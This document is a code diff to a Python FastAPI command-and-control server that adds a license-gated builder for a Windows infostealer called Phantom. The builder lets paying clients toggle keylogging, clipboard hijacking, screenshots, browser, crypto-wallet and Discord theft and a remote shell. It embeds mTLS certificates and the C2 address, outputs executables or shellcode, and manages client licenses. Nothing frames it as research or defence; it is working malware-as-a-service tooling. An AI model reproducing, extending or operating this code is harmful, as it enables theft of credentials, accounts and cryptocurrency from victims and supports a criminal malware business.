@@ -1,5 +1,6 @@
 """
-POST /api/build — payload builder (admin only).
+POST /api/build   — C2 agent builder (admin only)
+POST /api/phantom — Phantom stealer builder (license-gated)
 
 output = "standalone" → agent.exe  (direct beacon, no stager)
 output = "stager"     → stager.exe (downloads + in-memory loads agent.exe)
@@ -7,29 +8,44 @@ output = "stager"     → stager.exe (downloads + in-memory loads agent.exe)
 """
 from __future__ import annotations
 import asyncio
+import base64
+import datetime as _dt
 import os
+import re
+import shutil
 import sys
 import secrets
 import subprocess
+import tempfile
+import uuid
 from datetime import datetime, timezone
+from typing import Optional
 
-from fastapi import APIRouter, Depends, HTTPException
+from fastapi import APIRouter, BackgroundTasks, Depends, HTTPException
 from fastapi.responses import FileResponse, Response
 from pydantic import BaseModel
+from sqlalchemy.orm import Session
 
-from routers.auth import verify_admin
+import database
+from models.license import License
+from routers.auth import verify_admin, verify_phantom_access
 
 router = APIRouter(tags=["build"])
 
-_build_lock = asyncio.Lock()
+_build_lock   = asyncio.Lock()
+_phantom_lock = asyncio.Lock()
 
 # XOR key — must match agent/tools/obfuscate.py and gen_stager_config.py
 _XOR_KEY     = b"\x7a\x3f\x91\xc4\x52\x88\xb1\xde\xad\xbe\xef\x13\x37\xca\xfe\x42"
 _XOR_KEY_LEN = len(_XOR_KEY)
 
-_SERVER_DIR  = os.path.dirname(os.path.dirname(__file__))
-_AGENT_DIR   = os.path.normpath(os.path.join(_SERVER_DIR, "..", "agent"))
-_MAKE_EXE    = "C:/msys64/mingw64/bin/mingw32-make.exe"
+_SERVER_DIR       = os.path.dirname(os.path.dirname(__file__))
+_AGENT_DIR        = os.path.normpath(os.path.join(_SERVER_DIR, "..", "agent"))
+_PHANTOM_AGENT_DIR = os.environ.get(
+    "PHANTOM_AGENT_DIR",
+    r"C:\Users\zak28\OneDrive\Bureau\CETP\Malware Development\01_Projects\PhantomStealer",
+)
+_MAKE_EXE    = "C:/msys64/usr/bin/make.exe"
 _PYTHON_EXE  = sys.executable
 _AGENT_EXE   = os.path.join(_AGENT_DIR, "agent.exe")
 _STAGER_EXE  = os.path.join(_AGENT_DIR, "stager.exe")
@@ -283,3 +299,429 @@ async def build_payload(req: BuildRequest, _: str = Depends(verify_admin)):
             filename="stager.exe",
             headers={"Content-Disposition": 'attachment; filename="stager.exe"'},
         )
+
+
+# ── Phantom stealer builder ────────────────────────────────────────────────
+
+# Output base dir — outside OneDrive so AV/OneDrive can't quarantine builds.
+# Each build gets its own subdirectory (temp), deleted after streaming.
+_PHANTOM_BUILD_BASE = os.environ.get("PHANTOM_BUILD_BASE", "C:/Dev/phantom_build")
+_PHANTOM_CONFIG     = os.path.join(_PHANTOM_AGENT_DIR, "include", "phantom_config.h")
+_PHANTOM_CERT_H     = os.path.join(_PHANTOM_AGENT_DIR, "include", "client_cert_pfx.h")
+
+# Env vars that must NEVER be inherited by the make subprocess.
+# PHANTOM_DEBUG would compile debug logging (writes plaintext to C:/Windows/Temp).
+_ENV_STRIP = frozenset({
+    "PHANTOM_DEBUG", "PHANTOM_DEBUG_LOG", "PHANTOM_DEBUG_C2",
+})
+
+_FEATURE_FLAG_MAP = {
+    "keylogger":  "-DHAVE_KEYLOGGER",
+    "clipjack":   "-DHAVE_CLIPJACK",
+    "screenshot": "-DHAVE_SCREENSHOT",
+    "browser":    "-DHAVE_BROWSER",
+    "crypto":     "-DHAVE_CRYPTO",
+    "discord":    "-DHAVE_DISCORD",
+    "clipboard":  "-DHAVE_CLIPBOARD",
+    "shell":      "-DHAVE_SHELL",
+}
+
+# C2 endpoint is server-controlled — clients never choose where data goes.
+_PHANTOM_C2_HOST = os.environ.get("PHANTOM_C2_HOST", "127.0.0.1")
+_PHANTOM_C2_PORT = int(os.environ.get("PHANTOM_C2_PORT", "8443"))
+
+
+class PhantomFeatures(BaseModel):
+    keylogger:  bool = True
+    clipjack:   bool = True
+    screenshot: bool = True
+    browser:    bool = True
+    crypto:     bool = True
+    discord:    bool = True
+    clipboard:  bool = True
+    shell:      bool = False
+
+
+class PhantomBuildRequest(BaseModel):
+    license_key: str = ""   # required for admins; ignored for clients (key is bound to account)
+    poll_ms:     int = 30000
+    jitter_pct:  int = 20
+    features:    PhantomFeatures = PhantomFeatures()
+    format:      str = "pe"   # pe | bin
+
+
+def _bytes_to_c_array(name: str, data: bytes) -> bytes:
+    out = [f"/* auto-generated */\nstatic const unsigned char {name}[] = {{\n".encode()]
+    for i, b in enumerate(data):
+        if i % 16 == 0:
+            out.append(b"  ")
+        out.append(f"0x{b:02x}, ".encode())
+        if i % 16 == 15:
+            out.append(b"\n")
+    if len(data) % 16 != 0:
+        out.append(b"\n")
+    out.append(f"}};\nstatic const unsigned int {name}_LEN = {len(data)};\n".encode())
+    return b"".join(out)
+
+
+def _gen_client_cert(license_key: str, ca_cert_pem: str, ca_key_pem: str) -> bytes:
+    """Generate a per-license mTLS client cert signed by the operator CA. Returns PFX bytes."""
+    from cryptography import x509
+    from cryptography.x509.oid import NameOID
+    from cryptography.hazmat.primitives import hashes, serialization
+    from cryptography.hazmat.primitives.asymmetric import rsa
+    from cryptography.hazmat.primitives.serialization import pkcs12
+
+    ca_cert = x509.load_pem_x509_certificate(ca_cert_pem.encode())
+    ca_key  = serialization.load_pem_private_key(ca_key_pem.encode(), password=None)
+    client_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
+
+    now  = _dt.datetime.now(_dt.timezone.utc)
+    cert = (
+        x509.CertificateBuilder()
+        .subject_name(x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, license_key)]))
+        .issuer_name(ca_cert.subject)
+        .public_key(client_key.public_key())
+        .serial_number(x509.random_serial_number())
+        .not_valid_before(now)
+        .not_valid_after(now + _dt.timedelta(days=3650))
+        .add_extension(x509.BasicConstraints(ca=False, path_length=None), critical=True)
+        .sign(ca_key, hashes.SHA256())
+    )
+    return pkcs12.serialize_key_and_certificates(
+        name=license_key.encode(),
+        key=client_key,
+        cert=cert,
+        cas=None,
+        encryption_algorithm=serialization.NoEncryption(),
+    )
+
+
+def _embed_client_cert(pfx_bytes: bytes, build_dir: str) -> None:
+    """Write client_cert_pfx.h from PFX bytes via bin2h.py."""
+    pfx_tmp = os.path.join(build_dir, "client.pfx")
+    with open(pfx_tmp, "wb") as f:
+        f.write(pfx_bytes)
+
+    bin2h = os.path.join(_PHANTOM_AGENT_DIR, "tools", "bin2h.py")
+    r = subprocess.run(
+        [_PYTHON_EXE, bin2h, pfx_tmp, "CLIENT_CERT_PFX"],
+        capture_output=True, timeout=15,
+    )
+    if r.returncode != 0:
+        raise RuntimeError(f"bin2h failed: {r.stderr.decode()[:200]}")
+
+    # bin2h emits `_len` but the agent expects `_LEN`
+    header = r.stdout.replace(b"_len = ", b"_LEN = ")
+    with open(_PHANTOM_CERT_H, "wb") as f:
+        f.write(header)
+
+
+def _embed_ca_der_h(ca_cert_pem: str) -> None:
+    """Write operator_ca_der.h from CA PEM — embedded in agent to verify server TLS cert."""
+    from cryptography import x509
+    from cryptography.hazmat.primitives import serialization
+    cert = x509.load_pem_x509_certificate(ca_cert_pem.encode())
+    der  = cert.public_bytes(serialization.Encoding.DER)
+    h_path = os.path.join(_PHANTOM_AGENT_DIR, "include", "operator_ca_der.h")
+    with open(h_path, "wb") as f:
+        f.write(_bytes_to_c_array("OPERATOR_CA_DER", der))
+
+
+def _validate_phantom_req(req: PhantomBuildRequest) -> None:
+    if not (5000 <= req.poll_ms <= 600_000):
+        raise HTTPException(400, "poll_ms must be 5000–600000")
+    if not (0 <= req.jitter_pct <= 60):
+        raise HTTPException(400, "jitter_pct must be 0–60")
+    if req.format not in ("pe", "bin"):
+        raise HTTPException(400, "format must be 'pe' or 'bin'")
+
+
+def _build_feat_flags(features: PhantomFeatures) -> str:
+    return " ".join(
+        flag for name, flag in _FEATURE_FLAG_MAP.items()
+        if getattr(features, name)
+    )
+
+
+def _clean_env(extra: dict) -> dict:
+    env = {k: v for k, v in os.environ.items() if k not in _ENV_STRIP}
+    env.update(extra)
+    return env
+
+
+def _write_phantom_config(req: PhantomBuildRequest) -> None:
+    content = (
+        "#ifndef PHANTOM_CONFIG_H\n"
+        "#define PHANTOM_CONFIG_H\n\n"
+        f'#define C2_HOST  "{_PHANTOM_C2_HOST}"\n'
+        f"#define C2_PORT   {_PHANTOM_C2_PORT}\n"
+        f"#define C2_POLL_MS {req.poll_ms}\n"
+        f"#define JITTER_PCT {req.jitter_pct}\n\n"
+        "#endif /* PHANTOM_CONFIG_H */\n"
+    )
+    with open(_PHANTOM_CONFIG, "w", encoding="utf-8") as f:
+        f.write(content)
+
+
+def _make_phantom(feat_flags: str, watermark: str,
+                  build_dir: str, timeout: int = 180) -> subprocess.CompletedProcess:
+    gen_evs = os.path.join(_PHANTOM_AGENT_DIR, "tools", "gen_evs_strings.py")
+    r_evs = subprocess.run(
+        [_PYTHON_EXE, gen_evs],
+        capture_output=True, text=True, timeout=30,
+        cwd=_PHANTOM_AGENT_DIR,
+    )
+    if r_evs.returncode != 0:
+        raise RuntimeError("EVS generation failed")
+
+    enc_blob = os.path.join(_PHANTOM_AGENT_DIR, "tools", "encrypt_blob.py")
+    r_blob = subprocess.run(
+        [_PYTHON_EXE, enc_blob],
+        capture_output=True, text=True, timeout=30,
+        cwd=_PHANTOM_AGENT_DIR,
+    )
+    if r_blob.returncode != 0:
+        raise RuntimeError(f"Blob re-encode failed: {r_blob.stderr}")
+
+    build_dir_fwd = build_dir.replace("\\", "/")
+    # Prepend MSYS2 paths so make can find bash (needed for _LD_ENV TMP='' prefix syntax),
+    # mingw64 toolchain (g++, strip, objcopy), and python3.
+    _msys2_paths = [
+        "C:/msys64/usr/bin",
+        "C:/msys64/mingw64/bin",
+    ]
+    env = _clean_env({
+        "PHANTOM_FEAT_FLAGS": feat_flags,
+        "PHANTOM_WATERMARK":  watermark,
+        "PHANTOM_OUT":        build_dir_fwd,
+        "PATH": ";".join(_msys2_paths) + ";" + os.environ.get("PATH", ""),
+        "MSYSTEM": "MINGW64",
+    })
+    return subprocess.run(
+        [_MAKE_EXE, "-C", _PHANTOM_AGENT_DIR, "phantom-c2-build-only"],
+        capture_output=True, text=True, timeout=timeout, env=env,
+    )
+
+
+@router.post("/phantom")
+async def build_phantom(
+    req: PhantomBuildRequest,
+    background_tasks: BackgroundTasks,
+    caller: dict = Depends(verify_phantom_access),
+    db: Session = Depends(database.get_db),
+):
+    _validate_phantom_req(req)
+
+    # Clients: license key is bound to their account — body value is ignored.
+    # Admins:  license key comes from request body.
+    if caller["role"] == "client":
+        lic_key = caller["license_key"]
+    else:
+        lic_key = req.license_key.strip().upper()
+        if not lic_key:
+            raise HTTPException(400, "license_key is required")
+
+    lic = db.get(License, lic_key)
+    if not lic:
+        raise HTTPException(403, "Invalid license key")
+    ok, reason = lic.is_valid()
+    if not ok:
+        raise HTTPException(403, f"License rejected: {reason}")
+
+    if _phantom_lock.locked():
+        raise HTTPException(503, "Build already in progress — retry shortly")
+
+    async with _phantom_lock:
+        build_uuid = str(uuid.uuid4())
+        watermark  = f'-DBUILD_UUID=\\"{build_uuid}\\"'
+        feat_flags = _build_feat_flags(req.features)
+
+        # Per-build isolated output directory — deleted after the response is sent.
+        os.makedirs(_PHANTOM_BUILD_BASE, exist_ok=True)
+        build_dir = tempfile.mkdtemp(prefix="ph_", dir=_PHANTOM_BUILD_BASE)
+
+        try:
+            _write_phantom_config(req)
+        except OSError:
+            shutil.rmtree(build_dir, ignore_errors=True)
+            raise HTTPException(500, "Config write failed")
+
+        from services.ca import get_or_create as _get_ca
+        ca = _get_ca(db)
+
+        # Embed CA DER so agent can verify server TLS cert
+        try:
+            _embed_ca_der_h(ca.ca_cert_pem)
+        except Exception as e:
+            shutil.rmtree(build_dir, ignore_errors=True)
+            raise HTTPException(500, f"CA embed failed: {e}")
+
+        # Embed per-license client cert (generate on-the-fly if missing)
+        if not lic.cert_pfx_b64:
+            try:
+                pfx = _gen_client_cert(lic.key, ca.ca_cert_pem, ca.ca_key_pem)
+                lic.cert_pfx_b64 = base64.b64encode(pfx).decode()
+                db.commit()
+            except Exception as e:
+                shutil.rmtree(build_dir, ignore_errors=True)
+                raise HTTPException(500, f"Client cert generation failed: {e}")
+        try:
+            _embed_client_cert(base64.b64decode(lic.cert_pfx_b64), build_dir)
+        except Exception as e:
+            shutil.rmtree(build_dir, ignore_errors=True)
+            raise HTTPException(500, f"Cert embed failed: {e}")
+
+        try:
+            r = _make_phantom(feat_flags, watermark, build_dir)
+        except FileNotFoundError:
+            shutil.rmtree(build_dir, ignore_errors=True)
+            raise HTTPException(500, "make not found — MSYS2 required at C:/msys64")
+        except subprocess.TimeoutExpired:
+            shutil.rmtree(build_dir, ignore_errors=True)
+            raise HTTPException(500, "Compile timed out")
+        except RuntimeError as e:
+            shutil.rmtree(build_dir, ignore_errors=True)
+            raise HTTPException(500, str(e))
+
+        if r.returncode != 0:
+            shutil.rmtree(build_dir, ignore_errors=True)
+            # Strip server paths from compiler output before exposing to client.
+            stderr = re.sub(r'[A-Za-z]:[/\\][^\s\n]{0,120}', '[path]',
+                            (r.stderr or r.stdout)[-2000:])
+            raise HTTPException(500, f"Compile failed:\n{stderr}")
+
+        out_exe = os.path.join(build_dir, "phantom.exe")
+        if not os.path.exists(out_exe):
+            shutil.rmtree(build_dir, ignore_errors=True)
+            raise HTTPException(500, "phantom.exe not found after build")
+
+        # Update audit trail before streaming.
+        lic.build_count    += 1
+        lic.last_build_uuid = build_uuid
+        lic.last_build_at   = datetime.utcnow()
+        lic.last_feat_flags = feat_flags
+        lic.last_built_by   = caller["username"]
+        db.commit()
+
+        if req.format == "bin":
+            sc_path = os.path.join(build_dir, "phantom.bin")
+            pe2sc   = os.path.join(_PHANTOM_AGENT_DIR, "tools", "pe2sc.py")
+            try:
+                r_sc = subprocess.run(
+                    [_PYTHON_EXE, pe2sc, out_exe, sc_path],
+                    capture_output=True, text=True, timeout=120,
+                    env=_clean_env({}),
+                )
+            except subprocess.TimeoutExpired:
+                shutil.rmtree(build_dir, ignore_errors=True)
+                raise HTTPException(500, "Shellcode conversion timed out")
+            if r_sc.returncode != 0:
+                shutil.rmtree(build_dir, ignore_errors=True)
+                raise HTTPException(500, "Shellcode conversion failed")
+            if not os.path.exists(sc_path):
+                shutil.rmtree(build_dir, ignore_errors=True)
+                raise HTTPException(500, "phantom.bin not found after conversion")
+            # Schedule cleanup — fires after response body is fully sent.
+            background_tasks.add_task(shutil.rmtree, build_dir, True)
+            return FileResponse(
+                sc_path,
+                media_type="application/octet-stream",
+                filename="phantom.bin",
+                headers={"Content-Disposition": 'attachment; filename="phantom.bin"',
+                         "X-Build-UUID": build_uuid},
+            )
+
+        background_tasks.add_task(shutil.rmtree, build_dir, True)
+        return FileResponse(
+            out_exe,
+            media_type="application/octet-stream",
+            filename="phantom.exe",
+            headers={"Content-Disposition": 'attachment; filename="phantom.exe"',
+                     "X-Build-UUID": build_uuid},
+        )
+
+
+# ── License management (admin) ────────────────────────────────────────────────
+
+class LicenseCreateRequest(BaseModel):
+    label:      str          = ""
+    max_builds: Optional[int] = None
+    expires_at: Optional[str] = None   # ISO-8601 or None
+
+
+@router.post("/phantom/licenses", status_code=201)
+async def create_license(
+    body: LicenseCreateRequest,
+    _: str = Depends(verify_admin),
+    db: Session = Depends(database.get_db),
+):
+    key = License.generate()
+    exp = None
+    if body.expires_at:
+        try:
+            exp = datetime.fromisoformat(body.expires_at)
+        except ValueError:
+            raise HTTPException(400, "expires_at must be ISO-8601 (e.g. 2026-12-31T00:00:00)")
+
+    from services.ca import get_or_create as _get_ca
+    ca = _get_ca(db)
+    try:
+        pfx = _gen_client_cert(key, ca.ca_cert_pem, ca.ca_key_pem)
+        cert_pfx_b64 = base64.b64encode(pfx).decode()
+    except Exception:
+        cert_pfx_b64 = None
+
+    lic = License(key=key, label=body.label, max_builds=body.max_builds,
+                  expires_at=exp, cert_pfx_b64=cert_pfx_b64)
+    db.add(lic)
+    db.commit()
+    return _lic_dict(lic)
+
+
+@router.get("/phantom/licenses/me")
+async def my_license(
+    caller: dict = Depends(verify_phantom_access),
+    db: Session = Depends(database.get_db),
+):
+    if caller["role"] != "client":
+        raise HTTPException(403, "Clients only — admins use GET /phantom/licenses")
+    lic = db.get(License, caller["license_key"])
+    if not lic:
+        raise HTTPException(404, "License not found")
+    return _lic_dict(lic)
+
+
+@router.get("/phantom/licenses")
+async def list_licenses(
+    _: str = Depends(verify_admin),
+    db: Session = Depends(database.get_db),
+):
+    return [_lic_dict(l) for l in db.query(License).order_by(License.created_at.desc()).all()]
+
+
+@router.delete("/phantom/licenses/{key}", status_code=204)
+async def revoke_license(
+    key: str,
+    _: str = Depends(verify_admin),
+    db: Session = Depends(database.get_db),
+):
+    lic = db.get(License, key.strip().upper())
+    if not lic:
+        raise HTTPException(404, "License not found")
+    lic.is_active = False
+    db.commit()
+
+
+def _lic_dict(lic: License) -> dict:
+    return {
+        "key":           lic.key,
+        "label":         lic.label,
+        "is_active":     lic.is_active,
+        "build_count":   lic.build_count,
+        "max_builds":    lic.max_builds,
+        "created_at":    lic.created_at.isoformat()    if lic.created_at    else None,
+        "expires_at":    lic.expires_at.isoformat()    if lic.expires_at    else None,
+        "last_built_by": lic.last_built_by,
+        "last_build_at": lic.last_build_at.isoformat() if lic.last_build_at else None,
+    }
